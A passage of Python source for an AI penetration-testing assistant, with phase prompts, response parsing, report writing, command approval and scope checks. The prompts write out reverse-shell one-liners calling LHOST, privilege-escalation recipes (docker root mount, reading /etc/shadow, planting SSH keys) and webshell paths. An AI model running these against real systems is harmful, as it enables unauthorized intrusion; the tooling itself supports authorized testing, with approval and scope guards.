            cheatsheet_context=cheatsheet_context,
            credentials=data.get("credentials", {}),
            findings=data.get("findings", []),
            target_os=data.get("target_os", ""),
            imported_from=data.get("imported_from", []),
            hypotheses=data.get("hypotheses", []),
            attack_chains=data.get("attack_chains", []),
        )
        for rec in data.get("commands", []):
            session.commands.append(CommandRecord(
                phase=rec["phase"], command=rec["command"],
                exit_code=rec["exit_code"], output=rec["output"],
                useful=rec.get("useful", False), note=rec.get("note", ""),
                remote=rec.get("remote", False),
            ))
        return session


# ---------------------------------------------------------------------------
# AI system prompts per phase
# ---------------------------------------------------------------------------

SYSTEM_BASE = """\
You are xs-ai, a penetration-testing assistant for AUTHORIZED engagements only.
You help the operator by suggesting specific, executable commands one at a time.
The operator must approve every command before it runs.

Rules:
- Suggest ONE command at a time, with a short explanation of what it does and why.
- Format: put the command on its own line prefixed with CMD:
  Example: CMD: nmap -sV --top-ports 100 -T3 10.10.110.123
- After seeing results, analyze them and suggest the next logical step.
- When you find something useful, say FINDING: followed by a one-line summary.
- Be direct and practical. No disclaimers about authorization (the operator handles that).
- If you need credentials or info, say NEED: followed by what you need.
- For initial access, if you find a viable path, say ACCESS: followed by a one-liner.
- When done or stuck, say DONE: followed by a summary.
- When the operator provides a credential, use it in your suggested commands.
- For remote commands (SSH session active), suggest commands that run ON the target.

IMPORTANT — Tool execution split:
- EXECUTE DIRECTLY: nmap, curl, gobuster, feroxbuster, nikto, enum4linux, smbclient,
  rpcclient, ldapsearch, snmpwalk, dig, whatweb, wpscan, hydra, hashcat, john,
  searchsploit, ssh, crackmapexec, redis-cli, mysql, mssqlclient.py, ftp,
  id, whoami, uname, sudo -l, find (SUID/SGID/writable), getcap, ps, ss, netstat,
  cat, ls, mount, crontab, systeminfo, net, reg query, whoami /priv, schtasks, wmic,
  cmdkey, netsh, icacls.
- SUGGEST ONLY (need download): linpeas, winpeas, pspy, PrintSpoofer, GodPotato,
  SigmaPotato, JuicyPotato, PwnKit, DirtyPipe, Baron Samedit, traitor, Mimikatz,
  PowerUp, chisel, ligolo-ng, php_filter_chain_generator, git-dumper, msfvenom payloads,
  kernel exploits, Rubeus, BloodHound, SharpHound.
  For suggest-only tools: check prerequisites first with built-in commands, then say
  TOOL: <name> — <what it does> and explain how to download and use it.
"""

PHASE_PROMPTS = {
    "recon": """\
Phase: RECONNAISSANCE. Identify open ports, services, versions.
Decision tree:
1. Quick TCP scan (top 100 ports) → identify services
2. Full TCP scan (all 65535) → catch non-standard ports
3. UDP top 20 → DNS, SNMP, TFTP, NTP
4. Script scan (-sC) on discovered ports → version + vuln detection
5. OS detection if needed
After scans: note each open port, its service, and its version — these drive the enum phase.""",

    "enum": """\
Phase: ENUMERATION. Gather detailed info per service.
Service-specific decision tree:
- FTP(21): anonymous login → list files → download interesting ones
- SSH(22): banner grab → check auth methods → brute-force if authorized
- SMTP(25): VRFY/EXPN user enum → check for open relay
- DNS(53): zone transfer → subdomain brute-force
- HTTP(80/443/8080): headers → robots.txt → .git exposure → directory brute → CMS detection
  → If WordPress: wpscan users+vulns → plugin/theme vulns
  → If file upload: test extensions → webshell
  → If LFI: /etc/passwd → log poisoning → filter chain RCE
  → If SQLi: test with ' and UNION → dump creds
- NFS(2049): showmount → mount if no_root_squash → plant SSH key
- SMB(139/445): null session → shares → download files → known vulns (EternalBlue)
- MSSQL(1433): info → empty password → xp_cmdshell if SA
- MySQL(3306): info → empty root → file read (LOAD_FILE)
- RDP(3389): version → NLA check → brute-force if authorized
- WinRM(5985): check → evil-winrm if creds available
- SNMP(161): community strings → system/process/software/users enum
- Redis(6379): INFO → CONFIG → write webshell/SSH key
- LDAP(389): anonymous bind → dump users/groups
Use credentials if provided. Try service-specific enumeration.""",

    "access": """\
Phase: INITIAL ACCESS. Find a way in based on enumeration results.
Attack vectors to consider (priority order):
1. Known CVEs for detected service versions (searchsploit + manual)
2. Default/weak credentials (hydra/crackmapexec for SSH/RDP/WinRM/SMB/FTP)
3. Web vulnerabilities: SQLi → creds/RCE, LFI → log poisoning/filter chain, file upload → webshell
4. SMB: writable shares → place payload, MS17-010 (EternalBlue)
5. MSSQL: xp_cmdshell, file write
6. Redis: write SSH key or webshell
7. NFS: mount + plant SSH key
8. Password reuse across services
Reverse shell options:
- bash -i >& /dev/tcp/LHOST/LPORT 0>&1
- python3 -c 'import socket,subprocess,os;...'
- nc -e /bin/sh LHOST LPORT (or mkfifo variant)
- powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);..."
Give practical one-liner commands. For tools needing download (msfvenom, exploit scripts),
explain what to download and how to use it — say TOOL: <name>.""",

    "privesc": """\
Phase: PRIVILEGE ESCALATION. You have a shell on the target.
Commands run ON the target via SSH or manual paste.

Linux escalation decision tree:
1. id/groups → disk group? docker? lxd? adm?
   - docker group → docker run -v /:/mnt --rm -it alpine chroot /mnt sh
   - disk group → debugfs /dev/sda1 → read /etc/shadow
   - lxd group → import alpine image → mount root filesystem
2. sudo -l → what can we run?
   - GTFOBins: check each allowed binary at https://gtfobins.github.io
   - sudo env_keep (LD_PRELOAD) → compile shared lib → sudo any command
   - (ALL) NOPASSWD → direct root
3. SUID/SGID binaries → known exploitable? (GTFOBins)
4. Capabilities → cap_setuid on python/perl → setuid(0) + shell
5. Cron jobs → writable script? wildcard injection (tar)? PATH hijack?
6. Writable PATH dirs → place malicious binary
7. Python library hijack → writable .py in import path
8. Kernel version → suggest kernel exploit (DirtyPipe, PwnKit, etc.)
9. NFS no_root_squash → mount + create SUID shell
10. SSH key injection → write to /root/.ssh/authorized_keys if writable

Windows escalation decision tree:
1. whoami /priv → SeImpersonate? → suggest Potato family (PrintSpoofer/GodPotato)
   - SeBackup/SeRestore → backup SAM/SYSTEM → dump hashes
   - SeDebug → suggest Mimikatz
2. Services → unquoted paths? weak ACLs? writable service binary?
3. Scheduled tasks → writable script? missing binary?
4. AlwaysInstallElevated → craft MSI payload
5. Stored credentials → cmdkey /list → runas /savecred
6. Registry autologon → plaintext passwords
7. UAC bypass if medium integrity admin
8. Third-party software → known CVEs
9. PowerShell history → leaked credentials
10. SAM/SYSTEM file ACLs → dump and crack offline

For tools that NEED DOWNLOAD (linpeas/winpeas/pspy/Potato family/PwnKit/Mimikatz/PowerUp):
Check the prerequisite condition with built-in commands FIRST, then say
TOOL: <name> and explain download + usage. Do NOT suggest CMD: for download commands.""",
}


JSON_CONTRACT = """\
RESPONSE FORMAT — reply with a SINGLE JSON object and nothing else (no prose, no
markdown fences, no text before or after). Use exactly these keys:
{
  "message": "<your short analysis / explanation of the next step>",
  "command": "<ONE shell command to run next, or null if none>",
  "findings": ["<one-line finding>", ...],
  "needs": ["<info or credential you need>", ...],
  "access": "<initial-access one-liner, or null>",
  "tools": ["<download-only tool name — what it does>", ...],
  "done": false,
  "done_summary": "<summary if done, else empty>"
}
Put at most one command in "command". Use null/[]/"" for anything not applicable."""


def build_ai_prompt(session: Session, user_message: str,
                    structured: bool = False) -> tuple[str, str]:
    system_parts = [SYSTEM_BASE, PHASE_PROMPTS.get(session.phase, "")]

    if session.ssh:
        system_parts.append(f"SSH session active: {session.ssh.label} — commands run on the target.")
    if session.target_os:
        system_parts.append(f"Target OS: {session.target_os}")
    if session.cheatsheet_context:
        # Retrieve only the notes relevant to what the operator just asked,
        # instead of dumping the whole corpus and truncating.
        relevant_notes = retrieve_relevant(
            f"{session.phase} {user_message}",
            session.cheatsheet_context,
            k=RETRIEVE_CHEAT_K,
        )
        system_parts.append(
            f"Relevant operator notes (retrieved):\n---\n{relevant_notes}\n---"
        )
    if session.credentials:
        cred_info = ", ".join(f"{k}: {v}" for k, v in session.credentials.items())
        system_parts.append(f"Available credentials: {cred_info}")

    if structured:
        system_parts.append(JSON_CONTRACT)

    system = "\n\n".join(system_parts)

    prompt_parts = [f"Target: {session.target}"]
    evidence = session.evidence_summary(distill=True)
    if evidence != "(no useful results yet)":
        # Keep the evidence chunks most relevant to the current request.
        relevant_evidence = retrieve_relevant(
            f"{session.phase} {user_message}", evidence, k=RETRIEVE_EVIDENCE_K,
        )
        prompt_parts.append(f"Evidence so far (most relevant):\n{relevant_evidence}")
    prompt_parts.append(f"Operator: {user_message}")

    return system, "\n\n".join(prompt_parts)


# ---------------------------------------------------------------------------
# Parsing AI response
# ---------------------------------------------------------------------------

@dataclass
class AIResponse:
    text: str
    command: str | None = None
    findings: list[str] = field(default_factory=list)
    needs: list[str] = field(default_factory=list)
    access_line: str | None = None
    tool_suggestions: list[str] = field(default_factory=list)
    done: bool = False
    done_summary: str = ""


_JSON_KEYS = ("message", "command", "findings", "needs", "access",
              "tools", "done", "done_summary")


def _extract_json_object(text: str) -> dict | None:
    """Pull our response object out of a model reply, tolerating fences, prose
    before/after, stray braces in the prose, and unescaped control characters.

    Scans every '{' as a candidate start; returns the first balanced object that
    parses AND carries one of our keys. Falls back to the first valid object."""
    s = text.strip()
    if s.startswith("```"):
        s = re.sub(r"^```(?:json)?\s*", "", s)
        s = re.sub(r"\s*```$", "", s).strip()

    n = len(s)
    best: dict | None = None
    i = 0
    while i < n:
        if s[i] != "{":
            i += 1
            continue
        # walk from this '{' to its matching '}'
        depth, in_str, esc, end = 0, False, False, -1
        for j in range(i, n):
            ch = s[j]
            if in_str:
                if esc:
                    esc = False
                elif ch == "\\":
                    esc = True
                elif ch == '"':
                    in_str = False
            elif ch == '"':
                in_str = True
            elif ch == "{":
                depth += 1
            elif ch == "}":
                depth -= 1
                if depth == 0:
                    end = j + 1
                    break
        if end == -1:
            break  # unbalanced from here on
        try:
            # strict=False tolerates literal newlines/tabs inside string values
            obj = json.loads(s[i:end], strict=False)
        except json.JSONDecodeError:
            obj = None
        if isinstance(obj, dict):
            if any(k in obj for k in _JSON_KEYS):
                return obj
            if best is None:
                best = obj
        i = end
    return best


def _parse_json_response(obj: dict, text: str) -> AIResponse:
    def as_list(v) -> list[str]:
        if isinstance(v, list):
            return [str(x).strip() for x in v if str(x).strip()]
        if isinstance(v, str) and v.strip():
            return [v.strip()]
        return []

    msg = str(obj.get("message", "")).strip()
    resp = AIResponse(text=msg or text)
    cmd = obj.get("command")
    if isinstance(cmd, str) and cmd.strip() and cmd.strip().lower() not in ("null", "none"):
        resp.command = cmd.strip()
    resp.findings = as_list(obj.get("findings"))
    resp.needs = as_list(obj.get("needs"))
    access = obj.get("access")
    if isinstance(access, str) and access.strip() and access.strip().lower() not in ("null", "none"):
        resp.access_line = access.strip()
    resp.tool_suggestions = as_list(obj.get("tools"))
    resp.done = bool(obj.get("done"))
    resp.done_summary = str(obj.get("done_summary", "")).strip()
    return resp


def parse_ai_response(text: str) -> AIResponse:
    # Prefer a structured JSON reply; fall back to the legacy line protocol.
    obj = _extract_json_object(text)
    if obj is not None and any(key in obj for key in _JSON_KEYS):
        return _parse_json_response(obj, text)

    resp = AIResponse(text=text)
    for line in text.splitlines():
        stripped = line.strip()
        if stripped.startswith("CMD:") and not resp.command:
            resp.command = stripped[4:].strip()
        elif stripped.startswith("FINDING:"):
            resp.findings.append(stripped[8:].strip())
        elif stripped.startswith("NEED:"):
            resp.needs.append(stripped[5:].strip())
        elif stripped.startswith("ACCESS:"):
            resp.access_line = stripped[7:].strip()
        elif stripped.startswith("TOOL:"):
            resp.tool_suggestions.append(stripped[5:].strip())
        elif stripped.startswith("DONE:"):
            resp.done = True
            resp.done_summary = stripped[5:].strip()
    return resp


# ---------------------------------------------------------------------------
# Report generation
# ---------------------------------------------------------------------------

def generate_report(session: Session, output_dir: str) -> str:
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"report_{session.target.replace('.', '_')}_{ts}.md"
    filepath = os.path.join(output_dir, filename)

    useful = [r for r in session.commands if r.useful]
    not_useful = [r for r in session.commands if not r.useful]

    lines = [
        f"# xs-ai Pentest Report",
        f"",
        f"| Field | Value |",
        f"|-------|-------|",
        f"| Target | `{session.target}` |",
        f"| OS | {session.target_os or 'unknown'} |",
        f"| Date | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')} |",
        f"| Commands | {len(session.commands)} total, {len(useful)} useful |",
        f"| Credentials used | {'yes' if session.credentials else 'no'} |",
    ]
    if session.imported_from:
        lines.append(f"| Continued from | {'; '.join(session.imported_from)} |")
    lines += [
        "",
        "---",
        "",
        "## Findings",
        "",
    ]
    if session.findings:
        for i, f in enumerate(session.findings, 1):
            lines.append(f"{i}. {f}")
    else:
        lines.append("No findings recorded.")

    if session.hypotheses:
        lines += ["", "---", "", "## Research Hypotheses", "",
                  "| ID | Service | Severity | Confidence | Status | Observation |",
                  "|----|---------|----------|------------|--------|-------------|"]
        for h in session.hypotheses:
            obs = (h.get("observation", "") or "").replace("|", "\\|")[:80]
            lines.append(f"| {h.get('id','')} | {h.get('service','')} | {h.get('severity','')} | "
                         f"{h.get('confidence','')} | {h.get('status','')} | {obs} |")

    if session.attack_chains:
        lines += ["", "---", "", "## Attack Chains",
                  "", "_Reasoned scenarios linking observations — not proof of exploitation._", ""]
        for c in session.attack_chains:
            lines.append(f"### [{c.get('id','')}] {c.get('title','')} "
                         f"(confidence: {c.get('confidence','low')})")
            for i, step in enumerate(c.get("steps", []), 1):
                lines.append(f"{i}. {step}")
            if c.get("assumptions"):
                lines.append(f"- **Assumptions:** {'; '.join(c['assumptions'])}")
            if c.get("needed_evidence"):
                lines.append(f"- **Evidence needed:** {'; '.join(c['needed_evidence'])}")
            if c.get("impact"):
                lines.append(f"- **Potential impact:** {c['impact']}")
            lines.append("")

    lines += ["", "---", "", "## Useful Results", ""]
    for rec in useful:
        prefix = " (remote)" if rec.remote else ""
        lines.append(f"### [{rec.phase}]{prefix} `{rec.command}`")
        if rec.note:
            lines.append(f"**Note:** {rec.note}")
        lines.append(f"```")
        lines.append(rec.output[:MAX_OUTPUT])  # full captured output, never the distilled copy
        lines.append(f"```")
        lines.append("")

    lines += ["---", "", "## All Commands", ""]
    lines.append("| # | Phase | Where | Command | Result |")
    lines.append("|---|-------|-------|---------|--------|")
    for i, rec in enumerate(session.commands, 1):
        status = "useful" if rec.useful else f"exit {rec.exit_code}"
        where = "remote" if rec.remote else "local"
        cmd_short = rec.command[:55] + ("..." if len(rec.command) > 55 else "")
        lines.append(f"| {i} | {rec.phase} | {where} | `{cmd_short}` | {status} |")

    if not_useful:
        lines += ["", "---", "", "## No Result", ""]
        for rec in not_useful:
            lines.append(f"- `{rec.command}` (exit {rec.exit_code})")

    os.makedirs(output_dir, exist_ok=True)
    with open(filepath, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    return filepath


# ---------------------------------------------------------------------------
# Interactive helpers
# ---------------------------------------------------------------------------

COLOR = {
    "cyan":    "\033[96m",
    "green":   "\033[92m",
    "yellow":  "\033[93m",
    "red":     "\033[91m",
    "bold":    "\033[1m",
    "dim":     "\033[2m",
    "magenta": "\033[95m",
    "reset":   "\033[0m",
}

def cprint(color: str, text: str):
    print(f"{COLOR.get(color, '')}{text}{COLOR['reset']}")


# ---------------------------------------------------------------------------
# Terminal hygiene
#
# Subprocesses (ssh especially, and any tool that touches the TTY) can leave the
# terminal with echo or canonical mode turned off. The symptom: you type at an
# approval prompt but nothing shows up. We snapshot sane terminal settings at
# startup and restore them before every interactive prompt, and optionally flush
# any stray keystrokes buffered while a command was running.
# ---------------------------------------------------------------------------

_ORIG_TTY: list | None = None


def save_terminal() -> None:
    global _ORIG_TTY
    if termios and sys.stdin.isatty():
        try:
            _ORIG_TTY = termios.tcgetattr(sys.stdin.fileno())
        except Exception:
            _ORIG_TTY = None


def reset_terminal(flush: bool = False) -> None:
    """Restore echo + line editing before an interactive prompt (no-op off-TTY)."""
    if not termios or not sys.stdin.isatty():
        return
    fd = sys.stdin.fileno()
    try:
        if _ORIG_TTY is not None:
            termios.tcsetattr(fd, termios.TCSANOW, _ORIG_TTY)
        else:
            attrs = termios.tcgetattr(fd)
            attrs[3] |= (termios.ECHO | termios.ICANON | termios.ISIG | termios.IEXTEN)
            termios.tcsetattr(fd, termios.TCSANOW, attrs)
        if flush:
            # discard keys mashed while a command was running so they don't
            # silently pre-fill (or auto-answer) this prompt
            termios.tcflush(fd, termios.TCIFLUSH)
    except Exception:
        pass


def print_hypothesis(h) -> None:
    cprint("yellow", f"  [{h.id}] {h.service} — {h.severity.upper()} severity / "
                     f"{h.confidence} confidence / {h.status}")
    if h.observation:
        cprint("dim", f"       obs: {h.observation}")
    if h.cves:
        cprint("dim", f"       CVEs: {', '.join(h.cves)}")
    if h.validation_plan:
        cprint("green", f"       validate: {h.validation_plan}")
    if h.references:
        cprint("dim", f"       refs: {', '.join(h.references[:3])}")


def prompt_input(label: str = "xs-ai") -> str:
    reset_terminal(flush=True)
    try:
        return input(f"\n{COLOR['bold']}[{label}]>{COLOR['reset']} ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return ":quit"


def approve(cmd: str, remote: bool = False, warn: str = "") -> bool | str:
    where = " (REMOTE)" if remote else ""
    cprint("yellow", f"\n  Command{where}: {cmd}")
    if warn:
        cprint("magenta", f"  ⚠ {warn}")
    reset_terminal(flush=True)
    try:
        ans = input(f"  {COLOR['bold']}Execute? [y/n/edit]:{COLOR['reset']} ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        return False
    if ans == "edit":
        reset_terminal()
        try:
            edited = input(f"  {COLOR['bold']}New command:{COLOR['reset']} ").strip()
            if edited:
                return edited
        except (EOFError, KeyboardInterrupt):
            return False
    return ans in ("y", "yes")


def prior_warning(rec: CommandRecord) -> str:
    status = "succeeded" if rec.useful else f"exit {rec.exit_code}"
    note = f" — {rec.note}" if rec.note else ""
    return f"already run earlier ([{rec.phase}]{note}, {status})"


# ---------------------------------------------------------------------------
# Auto-enum: run a checklist with per-command approval
# ---------------------------------------------------------------------------

def generate_dynamic_checks(client, session: Session, port: str,
                            banner: str) -> list[tuple[str, str]]:
    """Ask the model for tailored enum commands for a service with no built-in
    checklist (unusual service or non-standard port). Returns (title, cmd) pairs
    with {target} placeholders, ready for run_auto_checks and operator approval."""
    prompt = (
        f"Target {session.target} has TCP port {port} open.\n"
        f"Service/version detection:\n{banner}\n\n"
        f"List 3 to 6 SPECIFIC, read-only, non-destructive enumeration commands "
        f"for THIS exact service. Output ONLY commands, one per line, each line "
        f"starting with 'CMD: '. Use the literal IP {session.target}. "
        f"No prose, no explanations, no numbering."
    )
    try:
        # Force the text protocol here regardless of structured mode — we want
        # several commands, not one JSON object.
        raw = client.run_phase(session.phase, prompt, SYSTEM_BASE, want_json=False)
    except ConnectionError as exc:
        cprint("red", f"  AI error: {exc}")
        return []

    checks: list[tuple[str, str]] = []
    seen: set[str] = set()
    for line in raw.splitlines():
        s = line.strip()
        if s.startswith("CMD:"):
            cmd = s[4:].strip()
        elif s.startswith("$ "):
            cmd = s[2:].strip()
        else:
            continue
        if not cmd or cmd in seen:
            continue
        seen.add(cmd)
        cmd = cmd.replace(session.target, "{target}")
        checks.append((f"AI check {len(checks) + 1} (port {port})", cmd))
    return checks


def _run_checks_parallel(checks: list[tuple[str, str]], session: Session,
                         execute_fn, redo: bool = False) -> list[CommandRecord]:
    """Run independent checks concurrently after a single batch approval."""
    from concurrent.futures import ThreadPoolExecutor

    cmds = [(title, tmpl.format(target=session.target)) for title, tmpl in checks]
    # re-test guard: drop checks already run successfully, unless redo is set
    if not redo:
        kept, skipped = [], 0
        for title, cmd in cmds:
            if session.prior_run(cmd, successful_only=True):
                skipped += 1
            else:
                kept.append((title, cmd))
        if skipped:
            cprint("magenta", f"  ⚠ Skipping {skipped} check(s) already run earlier (use 'redo' to force).")
        cmds = kept
    if not cmds:
        cprint("dim", "  Nothing new to run.")
        return []
    cprint("yellow", f"\n  Parallel auto-enum — {len(cmds)} independent checks:")
    for i, (title, cmd) in enumerate(cmds, 1):
        cprint("dim", f"    [{i}] {title}: {cmd}")
    where = " ON THE TARGET (remote)" if session.ssh else ""
    reset_terminal(flush=True)
    try:
        ans = input(f"  {COLOR['bold']}Run all {len(cmds)} concurrently{where}? [y/n]:{COLOR['reset']} ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        return []
    if ans not in ("y", "yes"):
        cprint("dim", "  Cancelled.")
        return []

    remote = bool(session.ssh)
    cprint("dim", f"  Dispatching {len(cmds)} checks ({PARALLEL_WORKERS} at a time)...")

    def _one(item: tuple[str, str]) -> CommandRecord:
        title, cmd = item
        code, output = execute_fn(cmd)
        return CommandRecord(
            phase=session.phase, command=cmd, exit_code=code, output=output,
            useful=(code == 0 and len(output.strip()) > 10), note=title, remote=remote,
        )

    results: list[CommandRecord] = []
    with ThreadPoolExecutor(max_workers=PARALLEL_WORKERS) as pool:
        for rec in pool.map(_one, cmds):
            results.append(rec)
            session.commands.append(rec)
            mark = "green" if rec.useful else "dim"
            status = f"{len(rec.output)} chars" if rec.useful else f"no output (exit {rec.exit_code})"
            cprint(mark, f"    [done] {rec.note}: {status}")
    return results


def run_auto_checks(checks: list[tuple[str, str]], session: Session,
                    client: OllamaClient | AIBackend | None, execute_fn,
                    parallel: bool = False, redo: bool = False) -> list[CommandRecord]:
    if parallel:
        results = _run_checks_parallel(checks, session, execute_fn, redo=redo)
    else:
        results = []
        cprint("cyan", f"\n  Auto-enum: {len(checks)} checks available")

        for i, (title, cmd_template) in enumerate(checks, 1):
            cmd = cmd_template.format(target=session.target)
            cprint("cyan", f"\n  [{i}/{len(checks)}] {title}")
            prior = session.prior_run(cmd, successful_only=True)
            if prior and not redo:
                cprint("magenta", f"  ⚠ {prior_warning(prior)} — skipping (use 'redo' to force).")
                continue
            approval = approve(cmd, remote=bool(session.ssh),
                               warn=prior_warning(prior) if prior else "")
            if approval is False:
                cprint("dim", "  Skipped.")
                continue

            cmd_to_run = approval if isinstance(approval, str) else cmd
            cprint("dim", f"  Running: {cmd_to_run}")
            code, output = execute_fn(cmd_to_run)
            is_useful = code == 0 and len(output.strip()) > 10
            rec = CommandRecord(
                phase=session.phase, command=cmd_to_run,
                exit_code=code, output=output, useful=is_useful,
                note=title, remote=bool(session.ssh),
            )
            session.commands.append(rec)
            results.append(rec)

            if is_useful:
                cprint("green", f"  Got results ({len(output)} chars)")
                if len(output) > 500:
                    print(output[:500] + "\n  ...[truncated in display]...")
                else:
                    print(output)
            else:
                cprint("dim", f"  No useful output (exit {code})")

    # AI summary of auto results
    if client and results:
        useful_outputs = [
            f"[{r.note}] $ {r.command}\n{distill_output(r.command, r.output)}"
            for r in results if r.useful
        ]
        if useful_outputs:
            cprint("dim", "\n  AI analyzing all results...")
            summary_prompt = (
                f"Target: {session.target}\n"
                f"Phase: {session.phase}\n"
                f"Results from automated checks:\n\n"
                + "\n\n---\n\n".join(useful_outputs[:10])
                + "\n\nSummarize key findings. For each finding say FINDING: on its own line."
            )
            system, _ = build_ai_prompt(session, "Summarize auto-enum results")
            try:
                analysis = client.analyze(summary_prompt, system)
                parsed = parse_ai_response(analysis)
                for f in parsed.findings:
                    if f not in session.findings:
                        session.findings.append(f)
                        cprint("green", f"  FINDING: {f}")
                for line in analysis.splitlines():
                    s = line.strip()
                    if s and not s.startswith(("FINDING:", "CMD:")):
                        print(f"  {line}")
            except ConnectionError:
                pass

    return results


# ---------------------------------------------------------------------------
# Main interactive loop
# ---------------------------------------------------------------------------

def show_help():
    print(textwrap.dedent("""
    Commands:
      <text>              Talk to AI — describe what you want
      :phase <name>       Switch phase (recon/enum/access/privesc)
      :cred <user> [pass] Set credentials
      :target <ip>        Change target
      :os <linux|windows> Set target OS (affects auto-enum checks)
      :ssh [user@host]    Connect SSH to target (or specify host)
      :ssh-key <path>     Set SSH key file
      :disconnect         Disconnect SSH
      :shell              Manual shell-paste mode
      :run <cmd>          Run a local command directly
      :rrun <cmd>         Run a command on remote target (SSH)
      :auto               Run auto-enum checks for current phase
      :svc <port>         Service enum for a port; unknown ports → AI dynamic checks
      :ports              Detect open ports and suggest service checks
      (--parallel starts auto-enum in batch-approve concurrent mode)
      :tools              Show downloadable tool suggestions for current phase
      :install            Check & install missing tools on Kali
      :memory             Save/show project memory (project.md)
      :roles              Show/set model-to-role mapping
      :roles <role> <model>  Assign a model to a role or phase
      :roles save         Save role mapping to roles.json
      :roles clear        Clear all role overrides
      :scan               Quick nmap scan (top 100 ports)
      :fullscan           Full nmap scan (all ports)
      :findings           Show current findings
      :history            Show command history
      :report             Generate report
      :save [file]        Save session state
      :load <file>        Load saved session (replaces current)
      :export [file]      Export a handoff bundle to share with another operator
      :import <file>      Merge another operator's bundle into this session
      :cheat <file>       Load additional cheat sheet
      :auto [redo]        Run auto-enum; 'redo' re-runs checks already done
      :svc <port> [redo]  Service enum; 'redo' re-runs checks already done
      :research <port>    Research a service → ranked vulnerability hypotheses
      :hypotheses         List recorded research hypotheses
      :validate <id>      Safely validate one hypothesis (approval + attempt-limited)
      :chains             Link findings/hypotheses into attack-chain scenarios
      :scope [show|add <t>|clear]  Show/modify authorized target scope
      :status             Show current session status
      :help               Show this help
      :quit               Exit
    """))


def manual_shell_mode(session: Session):
    cprint("cyan", "Manual shell mode — paste command output, type END when done.")
    cprint("cyan", "Type the command you ran first:")
    cmd = prompt_input("cmd")
    if cmd in (":quit", ":back", ""):
        return
    cprint("cyan", "Paste the output below. Type END on a new line when finished:")
    lines: list[str] = []
    while True:
        try:
            line = input()
        except (EOFError, KeyboardInterrupt):
            break
        if line.strip() == "END":
            break
        lines.append(line)
    output = "\n".join(lines)

    # Ask AI to analyze pasted output
    rec = CommandRecord(
        phase=session.phase, command=cmd,
        exit_code=0, output=output[:MAX_OUTPUT], useful=True,
        note="manual shell paste", remote=True,
    )
    session.commands.append(rec)
    cprint("green", f"  Recorded: {cmd}")


def show_status(session: Session):
    cprint("cyan", "\n  Session Status:")
    cprint("green", f"    Target:      {session.target}")
    cprint("green", f"    Phase:       {session.phase}")
    cprint("green", f"    Target OS:   {session.target_os or 'not set'}")
    cprint("green", f"    SSH:         {session.ssh.label if session.ssh else 'not connected'}")
    cprint("green", f"    Credentials: {'set (' + session.credentials.get('username', '') + ')' if session.credentials else 'not set'}")
    cprint("green", f"    Commands:    {len(session.commands)} ({sum(1 for r in session.commands if r.useful)} useful)")
    cprint("green", f"    Findings:    {len(session.findings)}")


def interactive_loop(client: OllamaClient | AIBackend, session: Session, scope: set[str],
                     report_dir: str, parallel: bool = False,
                     guard: ScopeGuard | None = None, online: bool = False,
                     cred_attempts: int = 3, cred_delay: float = 0.0):
    guard = guard or ScopeGuard(allow_any=True)  # back-compat if not supplied
    cred_used: dict[str, int] = {}  # hypothesis id -> validation attempts used
    research_engine = None
    if research is not None:
        research_engine = research.ResearchEngine(
            sources=research.default_sources("knowledge", session.cheatsheet_context),
            online=online,
        )
    cprint("cyan", BANNER)
    cprint("green", f"  Connected to: {client.base_url}")
    cprint("green", f"  Target: {session.target}")
    cprint("green", f"  Phase: {session.phase}")
    cprint("green", f"  Scope: {guard.status()}")
    if session.cheatsheet_context:
        cprint("green", f"  Cheat sheet loaded ({len(session.cheatsheet_context)} chars)")
    if session.commands:
        cprint("green", f"  Resumed session: {len(session.commands)} commands, {len(session.findings)} findings")
    cprint("dim", "  Type :help for commands\n")

    ssh_key_file: str | None = None

    def execute_cmd(cmd: str) -> tuple[int, str]:
        # central scope chokepoint — every auto/parallel/single-command route
        # flows through here, so nothing reaches a target without authorization
        ok, reason = guard.check_command(cmd, session.target)
        if not ok:
            guard.audit("blocked", session.target, cmd, reason)
            cprint("red", f"  [BLOCKED] {reason}")
            return 126, f"[BLOCKED] {reason}"
        guard.audit("execute", session.target, cmd, "remote" if session.ssh else "local")
        if session.ssh:
            return session.ssh.run(cmd)
        return run_command(cmd)

    def guarded_run(cmd: str, timeout: int = CMD_TIMEOUT) -> tuple[int, str]:
        ok, reason = guard.check_command(cmd, session.target)
        if not ok:
            guard.audit("blocked", session.target, cmd, reason)
            cprint("red", f"  [BLOCKED] {reason}")
            return 126, f"[BLOCKED] {reason}"
        guard.audit("execute", session.target, cmd, "local")
        return run_command(cmd, timeout=timeout)

    while True:
        label = session.phase
        if session.ssh:
            label += f"|ssh:{session.ssh.host}"
        user_input = prompt_input(label)

        if not user_input:
            continue

        # --- meta commands ---
        if user_input == ":quit":
            if session.commands:
                cprint("yellow", "Generating final report...")
                path = generate_report(session, report_dir)
                cprint("green", f"Report saved: {path}")
            break

        if user_input == ":help":
            show_help()
            continue

        if user_input == ":status":
            show_status(session)
            continue

        if user_input.startswith(":phase"):
            parts = user_input.split(maxsplit=1)
            if len(parts) == 2 and parts[1] in PHASES:
                session.phase = parts[1]
                cprint("green", f"  Phase -> {session.phase}")
            else:
                cprint("red", f"  Valid phases: {', '.join(PHASES)}")
            continue

        if user_input.startswith(":os"):
            parts = user_input.split(maxsplit=1)
            if len(parts) == 2 and parts[1] in ("linux", "windows"):
                session.target_os = parts[1]
                cprint("green", f"  Target OS -> {session.target_os}")
            else:
                cprint("red", "  Usage: :os linux  or  :os windows")
            continue

        if user_input.startswith(":cred"):
            parts = user_input.split(maxsplit=2)
            if len(parts) >= 3:
                session.credentials["username"] = parts[1]
                session.credentials["password"] = parts[2]
                cprint("green", f"  Credentials set for: {parts[1]}")
            elif len(parts) == 2:
                session.credentials["username"] = parts[1]
                reset_terminal(flush=True)
                pw = getpass.getpass("  Password: ")
                session.credentials["password"] = pw
                cprint("green", f"  Credentials set for: {parts[1]}")
            else:
                cprint("red", "  Usage: :cred <username> [password]")
            continue

        if user_input.startswith(":target"):
            parts = user_input.split(maxsplit=1)
            if len(parts) == 2:
                new_target = parts[1].strip()
                session.target = new_target
                ok, reason = guard.check(new_target)
                if ok:
                    cprint("green", f"  Target -> {session.target} (in scope)")
                else:
                    cprint("yellow", f"  Target -> {session.target}")
